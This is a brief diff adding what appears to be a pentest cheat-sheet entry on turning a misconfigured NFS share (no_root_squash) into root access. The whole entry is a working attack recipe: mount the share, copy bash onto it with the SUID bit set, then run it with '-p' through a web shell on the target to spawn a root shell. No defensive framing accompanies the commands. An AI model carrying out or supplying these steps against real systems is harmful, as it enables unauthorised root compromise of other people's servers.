@@ -1,0 +1,10 @@
+NFS → RCE (via SUID trick)
+bash# Mount with no_root_squash
+mkdir /tmp/nfs && mount -t nfs target:/share /tmp/nfs
+
+# Create SUID binary locally (root on attacker), copy to share
+cp /bin/bash /tmp/nfs/bash
+chmod +s /tmp/nfs/bash
+
+# On target via other access (web shell etc) run:
+/share/bash -p   # spawns root shell
